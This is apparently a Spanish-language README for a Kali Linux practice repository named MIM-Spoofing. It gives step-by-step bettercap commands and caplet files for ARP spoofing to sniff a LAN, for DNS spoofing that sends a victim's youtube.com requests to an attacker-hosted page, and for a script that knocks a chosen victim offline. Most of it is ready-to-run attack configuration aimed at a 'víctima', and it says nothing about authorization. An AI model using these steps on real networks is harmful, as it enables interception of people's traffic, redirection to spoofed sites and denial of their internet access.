> **❗Nota**: Toda esta práctica se ha realizado en Kali Linux.
# 🥷​MIM-Spoofing
## 🕵️‍♂️Configuración para esnifar el tráfico de la red haciendo Spoofing
En primer lugar, instalaremos el paquete bettercap, esta es la herramienta que vamos a usar para realizar este ataque.
```sh
sudo apt install bettercap
```
Y clonaremos el repositorio
```sh
git clone https://github.com/Dv-AlejandroEH/MIM-Spoofing.git
```
Una vez tengamos estos dos requisitos podemos empezar con el ataque.
Tenemos que modificar el archivo spoof.cap para indicar la IP de la victima.
```
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets [192.168.0.*] --> Esta es la IP que hay que cambiar
arp.spoof on
set net.sniff.local true
net.sniff on
```
Ya podremos ejecutar el siguiente comando
```sh
bettercap -iface eth0 -caplet spoof.cap
```
En este punto ya estamos viendo todo el tráfico de la red local

## 🔄​Configuración para DNS-Spoofing
En primer lugar, debemos de descargar apache para montar nuestro propio servidor HTTP:
```sh
sudo apt install apache2
```
Una vez instalado agregamos un index.html al directorio /var/www/html, esta página será a la que redigiremos a la victima.
Ejecutaremos el siguiente comando para levantar el servidor web.
```sh
sudo systemctl start apache2
```
En el repositorio que hemos clonado anteriormente, se incluia un archivo llamado spoof-dns.cap, deberemos de modificarlo para añadir los targets, los nombres DNS que queremos suplantar y la dirección IP a la que queremos redirigir a la víctima.
```
set arp.spoof targets [192.168.0.10] --> IP de la victima
arp.spoof on
set dns.spoof.domains [youtube.com] --> Dominio el cual queremos suplantar
set dns.spoof.address [192.168.0.12] --> Dirección IP a la que será dirigida la víctima (puede ser nuestro servidor web u otra IP ya existente en internet)
dns.spoof on
```
Cuando hayamos modificado este archivo podremos ejecutar el siguiente comando.
```sh
sudo bettercap -iface eth0 -caplet spoof-dns.cap
```
La víctima ya estará siendo atacada, cuando acceda a la dirección que le hemos indicado será redirigida a nuestra página.

## ❌​Configuración para denegar internet a la victima mediante Spoofing

Ejecutar el script de python
```sh
sudo python3 script.py
```
En la interfaz gráfica que nos ha aparecido introduciremos la IP a la que deseamos realizar el ataque y este se realizará automaticamente dejando a la víctima sin conexión a internet.
